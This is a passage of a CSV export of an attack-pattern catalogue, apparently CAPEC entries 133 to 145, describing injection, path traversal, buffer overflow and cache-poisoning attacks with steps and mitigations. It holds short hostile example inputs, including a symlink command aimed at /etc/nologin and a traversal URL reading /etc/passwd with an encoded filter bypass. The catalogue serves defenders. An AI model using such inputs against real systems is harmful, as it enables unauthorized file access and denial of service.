uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.:TECHNIQUE:The adversary monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the adversary can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.:TECHNIQUE:The adversary may need a little guesswork on the filenames on which the target application would operate.:TECHNIQUE:The adversary tries to create symlinks to the various filenames.::STEP:3:PHASE:Exploit:DESCRIPTION:[Target application operates on created symlinks to sensitive files] The adversary is able to create symlinks to sensitive files while the target application is operating on the file.:TECHNIQUE:Create the symlink to the sensitive file such as configuration files, etc.::\",\"::The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The adversary must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.::\",\"::SKILL:To create symlinks:LEVEL:Low::SKILL:To identify the files and create the symlinks during the file operation time window:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.::Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.::\",\"::The adversary creates a symlink with the same name as the file which the application is intending to write to. The application will write to the file- causing the data to be written where the symlink is pointing. An attack like this can be demonstrated as follows: root# vulprog myFile {...program does some processing...] adversary# ln –s /etc/nologin myFile [...program writes to 'myFile', which points to /etc/nologin...] In the above example, the root user ran a program with poorly written file handling routines, providing the filename myFile to vulnprog for the relevant data to be written to. However, the adversary happened to be looking over the shoulder of root at the time, and created a link from myFile to /etc/nologin. The attack would make no user be able to login.::\",\"::59::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.009:ENTRY NAME:Boot or Logon Autostart Execution:Shortcut Modification::\",\"\",\n133,\"Try All Common Switches\",Standard,Draft,\"An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is indiscriminately attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:113::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify application] Discover an application of interest by exploring service registry listings or by connecting on a known port or some similar means.:TECHNIQUE:Search via internet for known, published applications that allow option switches.:TECHNIQUE:Use automated tools to scan known ports to identify applications that might be accessible::STEP:2:PHASE:Explore:DESCRIPTION:[Authenticate to application] Authenticate to the application, if required, in order to explore it.:TECHNIQUE:Use published credentials to access system.:TECHNIQUE:Find unpublished credentails to access service.:TECHNIQUE:Use other attack pattern or weakness to bypass authentication.::STEP:3:PHASE:Experiment:DESCRIPTION:[Try all common switches] Using manual or automated means, attempt to run the application with many different known common switches. Observe the output to see if any switches seemed to put the application in a non production mode that might give more information.:TECHNIQUE:Manually execute the application with switches such as --debug, --test, --development, --verbose, etc.:TECHNIQUE:Use automated tools to run the application with common switches and observe the output::STEP:4:PHASE:Exploit:DESCRIPTION:[Use sensitive processing or configuration information] Once extra information is observed from an application through the use of a common switch, this information is used to aid other attacks on the application:TECHNIQUE:Using application information, formulate an attack on the application::\",\"::The attacker must be able to control the options or switches sent to the target.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to send requests to the target.::\",\"\",\"\",\"::Design: Minimize switch and option functionality to only that necessary for correct function of the command.::Implementation: Remove all debug and testing options from production code.::\",\"\",\"::912::\",\"\",\"\",\n134,\"Email Injection\",Standard,Draft,\"An adversary manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:137::\",\"\",\"::The target application must allow the user to send email to some recipient, to specify the content at least one header field in the message, and must fail to sanitize against the injection of command separators.::The adversary must have the ability to access the target mail application.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::150::\",\"TAXONOMY NAME:WASC:ENTRY ID:30:ENTRY NAME:Mail Command Injection::\",\"\",\n135,\"Format String Injection\",Standard,Draft,\"An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:137::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The adversary takes an inventory of the entry points of the application.:TECHNIQUE:Spider web sites for all available links:TECHNIQUE:List parameters, external variables, configuration files variables, etc. that are possibly used by the application.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.:TECHNIQUE:Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.::STEP:3:PHASE:Exploit:DESCRIPTION:[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.:TECHNIQUE:Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.::\",\"::The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.::\",\"::SKILL:In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Limit the usage of formatting string functions.::Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.::\",\"::Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027::\",\"::134::20::74::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Format string attack::\",\"\",\n136,\"LDAP Injection\",Standard,Draft,\"An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The attacker takes an inventory of the entry points of the application.:TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax:TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.:TECHNIQUE:Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.::\",\"::The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.::\",\"::SKILL:The attacker needs to have knowledge of LDAP, especially its query syntax.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.::\",\"::PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301::\",\"::77::90::20::\",\"TAXONOMY NAME:WASC:ENTRY ID:29:ENTRY NAME:LDAP Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:LDAP Injection::\",\"\",\n137,\"Parameter Injection\",Meta,Stable,\"An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.\",\"\",Medium,Medium,\"\",\"\",\"::The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.::The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to provide string input to the target.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:Successful parameter injection attacks mean a compromise to integrity of the application.::\",\"::Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise.::Treat all user input as untrusted data that must be validated before use.::\",\"\",\"::88::\",\"\",\"\",\n138,\"Reflection Injection\",Standard,Draft,\"An adversary supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an adversary can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the adversary created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the adversary take control of the targeted application.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:137::\",\"\",\"::The target application must utilize reflection libraries and allow users to directly control the parameters to these methods. If the adversary can host classes where the target can invoke them, more powerful variants of this attack are possible.::The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::470::\",\"\",\"\",\n139,\"Relative Path Traversal\",Detailed,Draft,\"An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:126::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to perform a valid path traversal, the adversary needs to know what the underlying OS is so that the proper file seperator is used.:TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The adversary uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey application] Using manual or automated means, an adversary will survey the target application looking for all areas where user input is taken to specify a file name or path.:TECHNIQUE:Use a spidering tool to follow and record all links on a web page. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of a web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore a website and analyze how it is constructed. Many browser plug-ins are available to facilitate the analysis or automate the URL discovery.::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] Using manual or automated means, an adversary attempts varying relative file path combinations on all found user input locations and observes the responses.:TECHNIQUE:Provide ../ or .. at the beginning of any filename to traverse to the parent directory:TECHNIQUE:Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as ../.:TECHNIQUE:Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.::STEP:4:PHASE:Exploit:DESCRIPTION:[Access, modify, or execute arbitrary files.] An adversary injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An adversary could be able to read directories or files which they are normally not allowed to read. The adversary could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the adversary accesses arbitrary files, they could also modify files. In particular situations, the adversary could also execute arbitrary code or system commands.:TECHNIQUE:Manipulate file and its path by injecting relative path sequences (e.g. ../).:TECHNIQUE:Download files, modify files, or try to execute shell commands (with binary files).::\",\"::The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.::\",\"::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass non trivial filters in the application:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement::Implementation: Perform input validation for all remote content, including remote and user-generated content.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- using an allowlist approach.::Implementation: Prefer working without user input when using file system calls::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::\",\"::The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.::\",\"::23::\",\"\",\"\",\n14,\"Client-side Injection-induced Buffer Overflow\",Detailed,Draft,\"This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service. This hostile service is created to deliver the correct content to the client software. For example, if the client-side application is a browser, the service will host a webpage that the browser loads.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target client-side application] The adversary identifies a target client-side application to perform the buffer overflow on. The most common are browsers. If there is a known browser vulnerability an adversary could target that.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:Many times client side applications will be open source, so an adversary can examine the source code to identify possible injection vectors.:TECHNIQUE:Examine APIs of the client-side application and look for areas where a buffer overflow might be possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Create hostile service] The adversary creates a hostile service that will deliver content to the client-side application. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:If the client-side application is a browser, the adversary will create a service that delivers a malicious webpage to the browser.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary delivers the content to the client-side application using the hostile service and overflows the buffer.:TECHNIQUE:If the adversary is targeting a local client-side application, they just need to use the service themselves.:TECHNIQUE:If the adversary is attempting to cause an overflow on an external user's client-side application, they must get the user to attach to their service by some other means. This could be getting a user to visit their hostile webpage to target a user's browser.::\",\"::The targeted client software communicates with an external server.::The targeted client software has a buffer overflow vulnerability.::\",\"::SKILL:To achieve a denial of service, an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.:LEVEL:High::\",\"\",\"::An example of indicator is when the client software crashes after executing code downloaded from a hostile server.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::The client software should not install untrusted code from a non-authenticated server.::The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.::Perform input validation for length of buffer inputs.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Ensure all buffer uses are consistently bounds-checked.::Use OS-level preventative functionality. Not a complete solution.::\",\"::Authors often use <EMBED> tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true> In Internet Explorer 4.0 an adversary attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.::\",\"::120::353::118::119::74::20::680::697::\",\"\",\"\",\n140,\"Bypassing of Intermediate Forms in Multiple-Form Sets\",Standard,Draft,\"Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:74::\",\"\",\"::The target must collect information from the user in a series of forms where each form has its own URL that the attacker can anticipate and the application must fail to detect attempts to access intermediate forms without first filling out the previous forms.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::372::\",\"\",\"\",\n141,\"Cache Poisoning\",Standard,Draft,\"An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:161::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.:TECHNIQUE:Run tools that check available entries in the cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.:TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, they are able to manipulate and interpose malicious response data to targeted victim queries.:TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).:TECHNIQUE:Adversary-in-the-Middle attacks (CAPEC-94) intercept secure communication between two parties.::\",\"::The attacker must be able to modify the value stored in a cache to match a desired value.::The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.::\",\"::SKILL:To overwrite/modify targeted cache:LEVEL:Medium::\",\"\",\"\",\"\",\"::Configuration: Disable client side caching.::Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes.::\",\"::In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::\",\"::348::345::349::346::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557.002:ENTRY NAME:Adversary-in-the-Middle: ARP Cache Poisoning::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cache Poisoning::\",\"\",\n142,\"DNS Cache Poisoning\",Detailed,Draft,\"A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:89::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.:TECHNIQUE:Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.:TECHNIQUE:Figure out if the client's browser has DNS cache enabled.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.:TECHNIQUE:Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.:TECHNIQUE:If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction:TECHNIQUE:Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.:TECHNIQUE:Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.:TECHNIQUE:Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties.::\",\"::A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.::\",\"::SKILL:To overwrite/modify targeted DNS cache:LEVEL:Medium::\",\"::The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.::\",\"\",\"\",\"::Configuration: Make sure your DNS servers have been updated to the latest versions::Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.::Configuration: Disable client side DNS caching.::\",\"::In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::\",\"::348::345::349::346::350::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1584.002:ENTRY NAME:Compromise Infrastructure: DNS Server::\",\"\",\n143,\"Detect Unpublicized Web Pages\",Detailed,Draft,\"An adversary searches a targeted web site for web pages that have not been publicized. In doing this, the adversary may be able to gain access to information that the targeted site did not intend to make public.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web site] An adversary finds a target web site that they think may have unpublicized web pages::STEP:2:PHASE:Explore:DESCRIPTION:[Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree:TECHNIQUE:Use Dirbuster to brute force directories and file names to find unpublicized pages:TECHNIQUE:Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked::STEP:3:PHASE:Experiment:DESCRIPTION:[Try to find weaknesses or information] The adversary will try to find weaknesses or information on the unpublicized pages that the targeted site did not intend to be public:TECHNIQUE:Manually analyze files or pages for information that could be useful in a further attack:TECHNIQUE:Use a static analysis tool to find weaknesses in unpublished web pages::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack::\",\"::The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack.::\",\"\",\"::Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.::\",\"\",\"\",\"\",\"\",\"::425::\",\"\",\"\",\n144,\"Detect Unpublicized Web Services\",Detailed,Draft,\"An adversary searches a targeted web site for web services that have not been publicized. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web site] An adversary finds a target web site that they think may have unpublicized web services::STEP:2:PHASE:Explore:DESCRIPTION:[Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree:TECHNIQUE:Use Dirbuster to brute force directories and file names to find unpublicized web services:TECHNIQUE:Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked::STEP:3:PHASE:Experiment:DESCRIPTION:[Try to find weaknesses or information] The adversary will try to find weaknesses in the unpublicized services that the targeted site did not intend to be public:TECHNIQUE:Use Nikto to look for web service vulnerabilities::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack::\",\"::The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack.::\",\"\",\"::Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.::\",\"\",\"\",\"\",\"\",\"::425::\",\"\",\"\",\n145,\"Checksum Spoofing\",Detailed,Draft,\"An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum 